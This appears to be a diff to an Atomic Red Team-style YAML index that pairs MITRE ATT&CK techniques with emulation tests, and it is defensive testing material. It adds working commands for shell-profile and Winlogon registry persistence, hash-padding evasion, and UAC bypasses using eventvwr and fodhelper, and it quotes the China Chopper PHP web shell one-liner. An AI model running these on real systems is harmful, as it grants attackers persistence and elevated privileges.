@@ -46,23 +46,40 @@ persistence:
       created: '2017-12-14T16:46:06.044Z'
       identifier: T1156
     atomic_tests:
-    - name: ".bash_profile and .bashrc"
-      description: 'xxx
+    - name: Add command to .bash_profile
+      description: 'Adds a command to the .bash_profile file of the current user
 
 '
       supported_platforms:
       - macos
       - linux
       input_arguments:
-        script:
-          description: path to script
-          type: path
+        command_to_add:
+          description: Command to add to the .bash_profile file
+          type: string
           default: "/path/to/script.py"
       executor:
         name: sh
-        command: |
-          echo "#{script}" >> ~/.bash_profile
-          echo "#{script}" >> ~/.bashrc
+        command: 'echo "#{command_to_add}" >> ~/.bash_profile
+
+'
+    - name: Add command to .bashrc
+      description: 'Adds a command to the .bashrc file of the current user
+
+'
+      supported_platforms:
+      - macos
+      - linux
+      input_arguments:
+        command_to_add:
+          description: Command to add to the .bashrc file
+          type: string
+          default: "/path/to/script.py"
+      executor:
+        name: sh
+        command: 'echo "#{command_to_add}" >> ~/.bashrc
+
+'
   T1015:
     technique:
       id: attack-pattern--9b99b83a-1aac-4e29-b975-b374950551a3
@@ -347,63 +364,58 @@ persistence:
               }
   '':
     technique:
-      id: attack-pattern--514ede4c-78b3-4d78-a38b-daddf6217a79
+      id: attack-pattern--c16e5409-ee53-4d79-afdc-4099dc9292df
       created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
-      name: Winlogon Helper DLL
-      description: "Winlogon.exe is a Windows component responsible for actions at
-        logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete.
-        Registry entries in <code>HKLM\\Software\\[Wow6432Node\\]Microsoft\\Windows
-        NT\\CurrentVersion\\Winlogon\\</code> and <code>HKCU\\Software\\Microsoft\\Windows
-        NT\\CurrentVersion\\Winlogon\\</code> are used to manage additional helper
-        programs and functionalities that support Winlogon. (Citation: Cylance Reg
-        Persistence Sept 2013) \n\nMalicious modifications to these Registry keys
-        may cause Winlogon to load and execute malicious DLLs and/or executables.
-        Specifically, the following subkeys have been known to be possibly vulnerable
-        to abuse: (Citation: Cylance Reg Persistence Sept 2013)\n\n* Winlogon\\Notify
-        - points to notification package DLLs that handle Winlogon events\n* Winlogon\\Userinit
-        - points to userinit.exe, the user initialization program executed when a
-        user logs on\n* Winlogon\\Shell - points to explorer.exe, the system shell
-        executed when a user logs on\n\nAdversaries may take advantage of these features
-        to repeatedly execute malicious code and establish Persistence."
+      name: Web Shell
+      description: |-
+        A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server. In addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (see, for example, China Chopper Web shell client). (Citation: Lee 2013)
+
+        Web shells may serve as [Redundant Access](https://attack.mitre.org/techniques/T1108) or as a persistence mechanism in case an adversary's primary access methods are detected and removed.
       external_references:
-      - external_id: T1004
-        url: https://attack.mitre.org/techniques/T1004
+      - external_id: T1100
+        url: https://attack.mitre.org/techniques/T1100
         source_name: mitre-attack
-      - external_id: CAPEC-579
-        url: https://capec.mitre.org/data/definitions/579.html
-        source_name: capec
-      - url: https://technet.microsoft.com/en-us/sysinternals/bb963902
-        description: Russinovich, M. (2016, January 4). Autoruns for Windows v13.51.
-          Retrieved June 6, 2016.
-        source_name: TechNet Autoruns
-      - url: https://blog.cylance.com/windows-registry-persistence-part-2-the-run-keys-and-search-order
-        description: 'Langendorf, S. (2013, September 24). Windows Registry Persistence,
-          Part 2: The Run Keys and Search-Order. Retrieved April 11, 2018.'
-        source_name: Cylance Reg Persistence Sept 2013
+      - url: https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-i.html
+        description: Lee, T., Hanzlik, D., Ahl, I. (2013, August 7). Breaking Down
+          the China Chopper Web Shell - Part I. Retrieved March 27, 2015.
+        source_name: Lee 2013
+      - url: https://www.us-cert.gov/ncas/alerts/TA15-314A
+        description: US-CERT. (2015, November 13). Compromised Web Servers and Web
+          Shells - Threat Awareness and Guidance. Retrieved June 8, 2016.
+        source_name: US-CERT Alert TA15-314A Web Shells
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       x_mitre_version: '1.0'
-      x_mitre_contributors:
-      - Praetorian
       x_mitre_data_sources:
-      - Windows Registry
+      - Anti-virus
+      - Authentication logs
       - File monitoring
+      - Netflow/Enclave netflow
       - Process monitoring
       x_mitre_detection: |-
-        Monitor for changes to Registry entries associated with Winlogon that do not correlate with known software, patch cycles, etc. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current Winlogon helper values. (Citation: TechNet Autoruns)  New DLLs written to System32 that do not correlate with known good software or patching may also be suspicious.
+        Web shells can be difficult to detect. Unlike other forms of persistent remote access, they do not initiate connections. The portion of the Web shell that is on the server may be small and innocuous looking. The PHP version of the China Chopper Web shell, for example, is the following short payload: (Citation: Lee 2013)
 
-        Look for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.
-      x_mitre_permissions_required:
-      - Administrator
+        <code><?php @eval($_POST['password']);></code>
+
+        Nevertheless, detection mechanisms exist. Process monitoring may be used to detect Web servers that perform suspicious actions such as running [cmd](https://attack.mitre.org/software/S0106) or accessing files that are not in the Web directory. File monitoring may be used to detect changes to files in the Web directory of a Web server that do not match with updates to the Web server's content and may indicate implantation of a Web shell script. Log authentication attempts to the server and any unusual traffic patterns to or from the server and internal network. (Citation: US-CERT Alert TA15-314A Web Shells)
+      x_mitre_effective_permissions:
       - SYSTEM
+      - User
       x_mitre_platforms:
+      - Linux
       - Windows
+      - macOS
+      x_mitre_system_requirements:
+      - Adversary access to Web server with vulnerability or account to upload and
+        serve the Web shell file.
       type: attack-pattern
       kill_chain_phases:
       - phase_name: persistence
         kill_chain_name: mitre-attack
+      - phase_name: privilege-escalation
+        kill_chain_name: mitre-attack
       modified: '2018-10-17T00:14:20.652Z'
-      created: '2017-05-31T21:30:20.148Z'
+      created: '2017-05-31T21:31:13.061Z'
     atomic_tests: []
   T1103:
     technique:
@@ -3565,6 +3577,120 @@ persistence:
           $FilterConsumerBindingToCleanup | Remove-WmiObject
           $EventConsumerToCleanup | Remove-WmiObject
           $EventFilterToCleanup | Remove-WmiObject
+  T1004:
+    technique:
+      id: attack-pattern--514ede4c-78b3-4d78-a38b-daddf6217a79
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      name: Winlogon Helper DLL
+      description: "Winlogon.exe is a Windows component responsible for actions at
+        logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete.
+        Registry entries in <code>HKLM\\Software\\[Wow6432Node\\]Microsoft\\Windows
+        NT\\CurrentVersion\\Winlogon\\</code> and <code>HKCU\\Software\\Microsoft\\Windows
+        NT\\CurrentVersion\\Winlogon\\</code> are used to manage additional helper
+        programs and functionalities that support Winlogon. (Citation: Cylance Reg
+        Persistence Sept 2013) \n\nMalicious modifications to these Registry keys
+        may cause Winlogon to load and execute malicious DLLs and/or executables.
+        Specifically, the following subkeys have been known to be possibly vulnerable
+        to abuse: (Citation: Cylance Reg Persistence Sept 2013)\n\n* Winlogon\\Notify
+        - points to notification package DLLs that handle Winlogon events\n* Winlogon\\Userinit
+        - points to userinit.exe, the user initialization program executed when a
+        user logs on\n* Winlogon\\Shell - points to explorer.exe, the system shell
+        executed when a user logs on\n\nAdversaries may take advantage of these features
+        to repeatedly execute malicious code and establish Persistence."
+      external_references:
+      - external_id: T1004
+        url: https://attack.mitre.org/techniques/T1004
+        source_name: mitre-attack
+      - external_id: CAPEC-579
+        url: https://capec.mitre.org/data/definitions/579.html
+        source_name: capec
+      - url: https://technet.microsoft.com/en-us/sysinternals/bb963902
+        description: Russinovich, M. (2016, January 4). Autoruns for Windows v13.51.
+          Retrieved June 6, 2016.
+        source_name: TechNet Autoruns
+      - url: https://blog.cylance.com/windows-registry-persistence-part-2-the-run-keys-and-search-order
+        description: 'Langendorf, S. (2013, September 24). Windows Registry Persistence,
+          Part 2: The Run Keys and Search-Order. Retrieved April 11, 2018.'
+        source_name: Cylance Reg Persistence Sept 2013
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.0'
+      x_mitre_contributors:
+      - Praetorian
+      x_mitre_data_sources:
+      - Windows Registry
+      - File monitoring
+      - Process monitoring
+      x_mitre_detection: |-
+        Monitor for changes to Registry entries associated with Winlogon that do not correlate with known software, patch cycles, etc. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current Winlogon helper values. (Citation: TechNet Autoruns)  New DLLs written to System32 that do not correlate with known good software or patching may also be suspicious.
+
+        Look for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.
+      x_mitre_permissions_required:
+      - Administrator
+      - SYSTEM
+      x_mitre_platforms:
+      - Windows
+      type: attack-pattern
+      kill_chain_phases:
+      - phase_name: persistence
+        kill_chain_name: mitre-attack
+      modified: '2018-10-17T00:14:20.652Z'
+      created: '2017-05-31T21:30:20.148Z'
+      identifier: T1004
+    atomic_tests:
+    - name: Winlogon Shell Key Persistence - PowerShell
+      description: 'PowerShell code to set Winlogon shell key to execute a binary
+        at logon along with explorer.exe.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        binary_to_execute:
+          description: Path of binary to execute
+          type: Path
+          default: C:\Windows\System32\cmd.exe
+      executor:
+        name: powershell
+        command: 'Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"
+          "Shell" "explorer.exe, #{binary_to_execute}" -Force
+
+'
+    - name: Winlogon Userinit Key Persistence - PowerShell
+      description: 'PowerShell code to set Winlogon userinit key to execute a binary
+        at logon along with userinit.exe.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        binary_to_execute:
+          description: Path of binary to execute
+          type: Path
+          default: C:\Windows\System32\cmd.exe
+      executor:
+        name: powershell
+        command: 'Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"
+          "Userinit" "Userinit.exe, #{binary_to_execute}" -Force
+
+'
+    - name: Winlogon Notify Key Logon Persistence - PowerShell
+      description: 'PowerShell code to set Winlogon Notify key to execute a notification
+        package DLL at logon.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        binary_to_execute:
+          description: Path of notification package to execute
+          type: Path
+          default: C:\Windows\Temp\atomicNotificationPackage.dll
+      executor:
+        name: powershell
+        command: |
+          New-Item "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify" -Force
+          Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify" "logon" "#{binary_to_execute}" -Force
 defense-evasion:
   T1134:
     technique:
@@ -3914,22 +4040,24 @@ defense-evasion:
       created: '2017-05-31T21:30:22.096Z'
       identifier: T1009
     atomic_tests:
-    - name: Pad Evil Binary to Change Hash
-      description: 'Copies cat to create an "evil binary" and pads it with a zero
-        to change the hash without harming execution
+    - name: Pad Binary to Change Hash - Linux/macOS dd
+      description: 'Uses dd to add a zero to the binary to change the hash
 
 '
       supported_platforms:
       - macos
       - linux
+      input_arguments:
+        binary_to_pad:
+          description: Path of binary to be padded
+          type: Path
+          default: "/tmp/EvilBinary"
       executor:
         name: sh
         command: |
-          cp /bin/cat /tmp/evilCat
-          md5sum /tmp/evilCat
-          dd if=/dev/zero bs=1 count=1 >> /tmp/evilCat
-          md5sum /tmp/evilCat
-          /tmp/evilCat .bash_profile
+          md5sum #{binary_to_pad}
+          dd if=/dev/zero bs=1 count=1 >> #{binary_to_pad}
+          md5sum #{binary_to_pad}
   T1088:
     technique:
       id: attack-pattern--ca1a3f50-5ebd-41f8-8320-2c7d6a6e88be
@@ -4044,6 +4172,61 @@ defense-evasion:
         command: |
           reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d "#{executable_binary}" /f
           cmd.exe -c eventvwr.msc
+    - name: Bypass UAC using Event Viewer - PowerShell
+      description: 'PowerShell code to bypass User Account Control using Event Viewer
+        and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        executable_binary:
+          description: Binary to execute with UAC Bypass
+          type: path
+          default: C:\Windows\System32\cmd.exe
+      executor:
+        name: command_prompt
+        command: |
+          New-Item "HKCU:\software\classes\mscfile\shell\open\command" -Force
+          Set-ItemProperty "HKCU:\software\classes\mscfile\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force
+          Start-Process "C:\Windows\System32\eventvwr.msc"
+    - name: Bypass UAC using Fodhelper
+      description: 'Bypasses User Account Control using the Windows 10 Features on
+        Demand Helper (fodhelper.exe). Requires Windows 10.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        executable_binary:
+          description: Binary to execute with UAC Bypass
+          type: path
+          default: C:\Windows\System32\cmd.exe
+      executor:
+        name: command_prompt
+        command: |
+          reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "#{executable_binary}" /f
+          reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute"
+          fodhelper.exe
+    - name: Bypass UAC using Fodhelper - PowerShell
+      description: 'PowerShell code to bypass User Account Control using the Windows
+        10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        executable_binary:
+          description: Binary to execute with UAC Bypass
+          type: path
+          default: C:\Windows\System32\cmd.exe
+      executor:
+        name: powershell
+        command: |
+          New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
+          New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
+          Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force
+          Start-Process "C:\Windows\System32\fodhelper.exe"
   T1191:
     technique:
       id: attack-pattern--7d6f590f-544b-45b4-9a42-e0805f342af3
@@ -9361,6 +9544,61 @@ privilege-escalation:
         command: |
           reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d "#{executable_binary}" /f
           cmd.exe -c eventvwr.msc
+    - name: Bypass UAC using Event Viewer - PowerShell
+      description: 'PowerShell code to bypass User Account Control using Event Viewer
+        and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        executable_binary:
+          description: Binary to execute with UAC Bypass
+          type: path
+          default: C:\Windows\System32\cmd.exe
+      executor:
+        name: command_prompt
+        command: |
+          New-Item "HKCU:\software\classes\mscfile\shell\open\command" -Force
+          Set-ItemProperty "HKCU:\software\classes\mscfile\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force
+          Start-Process "C:\Windows\System32\eventvwr.msc"
+    - name: Bypass UAC using Fodhelper
+      description: 'Bypasses User Account Control using the Windows 10 Features on
+        Demand Helper (fodhelper.exe). Requires Windows 10.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        executable_binary:
+          description: Binary to execute with UAC Bypass
+          type: path
+          default: C:\Windows\System32\cmd.exe
+      executor:
+        name: command_prompt
+        command: |
+          reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "#{executable_binary}" /f
+          reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute"
+          fodhelper.exe
+    - name: Bypass UAC using Fodhelper - PowerShell
+      description: 'PowerShell code to bypass User Account Control using the Windows
+        10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        executable_binary:
+          description: Binary to execute with UAC Bypass
+          type: path
+          default: C:\Windows\System32\cmd.exe
+      executor:
+        name: powershell
+        command: |
+          New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
+          New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
+          Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force
+          Start-Process "C:\Windows\System32\fodhelper.exe"
   T1179:
     technique:
       id: attack-pattern--66f73398-8394-4711-85e5-34c8540b22a5
